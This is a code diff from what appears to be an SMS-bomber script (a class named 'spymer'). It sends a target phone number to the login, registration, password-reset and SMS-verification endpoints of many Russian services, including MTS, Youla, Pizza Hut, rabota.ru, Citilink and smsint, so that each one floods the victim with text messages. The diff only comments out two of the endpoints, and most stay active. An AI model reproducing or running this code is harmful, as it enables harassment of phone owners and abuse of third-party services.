@@ -69,7 +69,7 @@ class spymer:
 			mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
 			
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
-			youdrive =  requests.post(' http://youdrive.today/login/web/phone', data={'phone': _phone9, 'phone_code':'7'})
+			#youdrive =  requests.post(' http://youdrive.today/login/web/phone', data={'phone': _phone9, 'phone_code':'7'})
 			pizzahut = requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
 			rabota = requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
 #			drugvokrug = requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': _phone})
@@ -79,7 +79,7 @@ class spymer:
 			citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
 #			dozarplati = requests.post('https://online-api.dozarplati.com/rpc', json={"id":'1',"jsonrpc":"2.0","method":"auth.login","params":{"phoneNumber":"79153509908"}})
 #			fastmoney = requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]': '+' + _phone, 'RegistrationForm[password]': '12345', 'RegistrationForm[confirmPassword]': '12345', 'yt0': 'Регистрация'})
-			findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
+			#findclone = requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
 #			pmsm = requests.post('https://ube.pmsm.org.ru/esb/os-reg/submission', json={'data': {'firstName': _text, 'lastName': '***', 'phone': _phone, 'email': _name+'@gmail.com', 'password': _name, 'passwordConfirm': _name}})
 			smsint = requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
 #			lenta = requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
